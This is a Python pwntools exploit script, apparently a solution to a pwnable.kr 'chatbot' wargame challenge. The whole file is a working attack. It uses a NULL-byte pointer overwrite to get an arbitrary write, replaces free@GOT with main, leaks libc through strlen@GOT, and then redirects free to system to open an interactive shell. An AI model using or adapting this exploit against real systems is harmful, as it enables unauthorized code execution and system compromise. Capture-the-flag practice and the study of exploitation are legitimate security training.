import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import *

elf = context.binary =  ELF("./chatbot")
libc = ELF("./libc-2.23.so",checksec=False)

domain="0.0.0.0"
#domain = "pwnable.kr"
port = 9044

def start():
    if args.REMOTE:
        return remote(domain, port)
    else:
        # not working properly
        return process("./chatbot") 

#========= exploit here ===================
r = start()

def init(id, pw):
    r.sendlineafter(b"ID",id)
    r.sendlineafter(b"PW",pw)
    sleep(0.5)

def vuln():
    # Overwrite LSB in "prompt" with NULL byte
    for _ in range(8):
        r.sendlineafter(b">",b"beach")
    for _ in range(13):
        r.sendlineafter(b">",b"duck")

def overwrite(what, where):
    # strlen(prompt) = 32 but prompt is "> " and _len = 2
    # write-what-where , what = buffer, where = hijacked _dest
    payload = b"\x7f" * 2
    payload += what
    payload += b"\x7f" * (8 + len(what))
    payload += where
    sleep(0.5)
    r.sendlineafter(b">",payload)

def decode_tty_notation(data):
    res = b""
    i = 0
    while i < len(data):
        if data[i:i+2] == b"^?":
            res += bytes([0x7f])
            i += 2
        elif data[i] == ord(b"^")     and  \
             i < len(data)-1          and  \
             data[i+1] >= 0x40        and  \
             data[i+1] <= 0x5F:
                res += bytes([data[i+1] - 0x40])
                i += 2
        elif data[i] == ord(b"~")     and  \
             i < len(data)-1          and  \
             data[i+1] < 0xc0:
                res += bytes([data[i+1] + 0x40])
                i += 2
        else:
            res += bytes([data[i]])
            i += 1
    return res

# Gain infinite oportunities
init(b"id",b"pw")
vuln()
what = p64(elf.sym["main"]).rstrip(b"\x00")
where = p64(elf.got["free"]).rstrip(b"\x00")
overwrite(what, where)
r.info(f"Overwrote free@got.plt with main")
r.sendlineafter(b">",b"/quit")

# Leak libc
init(b"id",b"pw")
vuln()
what = p64(elf.got["strlen"]).rstrip(b"\x00")
where = p64(elf.sym["prompt"]).rstrip(b"\x00")
overwrite(what, where)
r.sendline(b"EGG855")
leak = r.recvuntil(b"EGG855")
leak = leak.rsplit(b"0\x1b[0mx\x1b(B")[3603]
leak = leak.split(b"EGG855")[0]
leak = decode_tty_notation(leak)
leak = u64(leak.ljust(8,b"\x00"))
libc.address = leak - libc.sym["strlen"]
r.info(f"Overwrote prompt with strlen@got.plt")
r.info(f"Libc address: {hex(libc.address)}")
r.sendlineafter(b">",b"/quit")

# Write what where with scanf
init(b"%6$llu-%26$llu", b"sh")
vuln()
what = p64(elf.sym["__isoc99_scanf"]).rstrip(b"\x00")
where = p64(elf.got["free"]).rstrip(b"\x00")
overwrite(what, where)
r.info(f"Overwrote free@got.plt with __isoc99_scanf@plt")
r.sendlineafter(b">",b"/quit")
r.sendline(f"{elf.got['free']}-{libc.sym['system']}".encode())
r.info(f"Overwrote free@got.plt with __libc_system")
r.success("Dropping shell...")
sleep(0.5)
r.interactive()
